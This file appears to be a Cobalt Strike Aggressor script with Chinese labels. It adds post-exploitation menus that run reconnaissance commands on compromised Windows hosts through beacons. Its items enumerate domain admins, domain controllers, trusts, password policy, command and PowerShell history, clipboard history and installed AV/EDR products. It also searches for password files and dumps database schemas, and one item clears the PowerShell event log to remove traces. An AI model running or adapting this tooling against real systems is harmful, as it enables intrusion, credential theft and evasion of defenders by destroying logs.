menu "信息搜集" {
    menu "当前系统信息"{
        item "查看正在运行的应用程序窗口" {
            $bid = $1['@'];
            bpowershell_import($bid, script_resource("/scripts/systeminfo/Getprocess_Gui.ps1"));
            bpowerpick($bid,"Getprocess_Gui");
            bshell($bid,"wevtutil cl \"Windows PowerShell\"");
        }
        item "查看最近有哪些用户登陆" {
            $bid = $1['@'];
            bshell($bid, "finger username @host")
        }
        item "查看密码策略" {
            $bid = $1['@'];
            bshell($bid, "net accounts")
        }
        item "查看安装的补丁" {
            $bid = $1['@'];
			bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
		}
        item "查看在线用户" {
			$bid = $1['@'];
			bshell($bid, "query user || qwinsta");
		}
        item "查看启动程序信息" {
			$bid = $1['@'];
			bshell($bid, "wmic startup get command,caption");
		}
        item "查看防火墙配置" {
			$bid = $1['@'];
			bshell($bid, "netsh firewall show config");
		}
        item "查看运行的进程及路径" {
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,executablepath,commandline");
		}
		item "查看进程详细信息" {
			$bid = $1['@'];
			bshell($bid, "wmic process get caption,commandline,processid /value");
		}
        item "查看计划任务" {
			$bid = $1['@'];
			bshell($bid, "schtasks.exe");
		}
		item "查看计划任务详情" {
			$bid = $1['@'];
			bshell($bid, "schtasks /query /fo LIST /v");
		}
        item "查看安装程序和版本信息" {
			$bid = $1['@'];
			bshell($bid, "wmic product get name,version");
		}
        item "查看服务" {
			$bid = $1['@'];
			bshell($bid, "wmic service list brief");
		}
        item "查看在线用户" {
			$bid = $1['@'];
			bshell($bid, "query user || qwinsta");
		}
        item "查看cmd历史命令" {
            $bid = $1['@'];
            bshell($bid, "doskey /history");
        }
        item "查看powershell历史命令" {
			$bid = $1['@'];
			bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
		}
        item "查看文件浏览历史" {
            $bid = $1['@'];
            bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
        }
        item "查看SMB指向路径" {
			$bid = $1['@'];
			bshell($bid, "wmic share get name,path");
		}
        item "查找网站数据库配置文件" {
            prompt_text("网站目录", "", lambda({
        bshell(@bid, "dir / a / s / b \"$1\ * config *\"");}, @bid => $bid));
        }

    }
    menu "内网信息搜集"{
        item "查询域" {
			$bid = $1['@'];
			bshell($bid, "net view /domain");
		}
		item "查看域管" {
			$bid = $1['@'];
			bshell($bid, "net group \"domain admins\" /domain");
		}
		item "查看域用户详细信息" {
			prompt_text("输入域用户名", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
		}
		item "查看当前登录域" {
			$bid = $1['@'];
			bshell($bid, "net config workstation");
		}
		item "查看时间服务器" {
			$bid = $1['@'];
			bshell($bid, "net time /domain");
		}
		item "显示当前域的计算机列表" {
			$bid = $1['@'];
			bshell($bid, "net view");
		}
		item "查看登录本机的域管" {
			$bid = $1['@'];
			bshell($bid, "net localgroup administrators /domain");
		}
		item "查看所有域用户" {
			$bid = $1['@'];
			bshell($bid, "net user /domain");
		}
		item "查看域内所有用户组列表" {
			$bid = $1['@'];
			bshell($bid, "net group /domain");
		}
		item "查看主域控制器" {
			$bid = $1['@'];
			bshell($bid, "netdom query pdc");
		}
		item "查看域控列表" {
			$bid = $1['@'];
			bshell($bid, "net group \"Domain Controllers\" /domain");
		}
		item "查看域控主机名" {
			$bid = $1['@'];
			bshell($bid, "Nslookup -type=SRV _ldap._tcp");
		}
		item "获取域信任信息" {
			$bid = $1['@'];
			bshell($bid, "nltest /domain_trusts");
		}
		item "获取域密码信息" {
			$bid = $1['@'];
			bshell($bid, "net accounts /domain");
		}
		item "查看所有域成员计算机列表" {
			$bid = $1['@'];
			bshell($bid, "net group \"domain computers\" /domain");
		}
		item "查看域内所有计算机" {
			prompt_text("输入主机名", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
		}


    }
    item "SharpChassisType(判断主机类型)" {
		$bid = $1['@'];
		$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
		dialog_description($dialog,"用于判断当前机器类型(桌面计算机、笔记本等判断)。项目地址：https://github.com/RcoIl/CSharp-Tools/");
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpChassisType{
	    bexecute_assembly($bid, script_resource("/scripts/systeminfo/SharpChassisType.exe"), "");
	}


	item "SharpEventLog(获取系统登录日志)" {
		$bid = $1;
		$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
		dialog_description($dialog, "读取登录过本机的登录失败或登录成功（4624，4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。项目地址：https://github.com/uknowsec/SharpEventLog");
		drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpEventLog {
		bexecute_assembly($bid, script_resource("/scripts/systeminfo/SharpEventLog.exe"), $3['EventLogType']);
	}

	item "SharpCheckInfo(获取多项主机信息)" {
		$bid = $1;
		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
		dialog_description($dialog, "收集目标主机信息，包括最近打开文件，系统环境变量和回收站文件等等。项目地址：https://github.com/uknowsec/SharpCheckInfo");
		drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpCheckInfo {
		bexecute_assembly($bid, script_resource("/scripts/systeminfo/SharpCheckInfo.exe"), $3['Type']);
	}

	item "SharpSQLDump(快速列出数据库数据)" {
		$bid = $1['@'];
		$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
		dialog_description($dialog, "内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。项目地址：https://github.com/uknowsec/SharpSQLDump");
		drow_text($dialog, "host", "host:  ");
		drow_text($dialog, "username", "username:  ");
		drow_text($dialog, "password", "password:  ");
		drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpSQLDump {
		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
		bexecute_assembly($bid, script_resource("/scripts/systeminfo/SharpSQLDump.exe"), $arg);
	}

	item "SharpClipHistory(获取win10剪切板)" {
		$bid = $1;
		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
		dialog_description($dialog, "可用于从1809 Build版本开始读取Windows 10中用户剪贴板历史记录的内容。空白类型选项表示读取。项目地址：https://github.com/FSecureLABS/SharpClipHistory");
		drow_combobox($dialog, "Type", "Type:", @("--help","","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpClipHistory {
		bexecute_assembly($bid, script_resource("/scripts/systeminfo/SharpClipHistory.exe"), $3['Type']);
	}

	item "SharpAVKB(杀软和补丁对比)" {
		$bid = $1;
		$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
		dialog_description($dialog, "Windows杀软对比和补丁号对比。项目地址：https://github.com/uknowsec/SharpAVKB");
		drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpAVKB {
		bexecute_assembly($bid, script_resource("/scripts/systeminfo/SharpAVKB.exe"), $3['type']);
	}

	item "SharpEDRChecker(获取EDR信息)" {
		$bid = $1['@'];
		btask($bid, "检查正在运行的进程，进程元数据，加载到当前进程中的Dll以及每个DLL元数据，通用安装目录，已安装的服务和每个服务二进制元数据，已安装的驱动程序和每个驱动程序元数据，所有这些都存在已知的防御性产品，例如AV，EDR和日志记录工具。还可以通过其元数据检查来捕获隐藏的EDR。项目地址：https://github.com/PwnDexter/SharpEDRChecker", "");
		bexecute_assembly($1, script_resource("/scripts/systeminfo/SharpEDRChecker.exe"), "");
	}

	item "SharpDir(文件搜索)" {
		$bid = $1['@'];
		$dialog = dialog("文件搜索", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
		dialog_description($dialog, "文件搜索，三种搜索方式，指定文件名、制定文件名搜索后缀、搜索指定后缀文件。项目地址：https://github.com/jnqpblc/SharpDir");
		drow_text($dialog, "path", "path:  ");
		drow_text($dialog, "file", "file:  ");
		dbutton_action($dialog, "运行");
		dialog_show($dialog);
	}
	sub SharpDir {
		$arg = join(' ', @($3['path'],$3['file']));
		bexecute_assembly($bid, script_resource("/scripts/systeminfo/SharpDir.exe"), $arg);
	}
}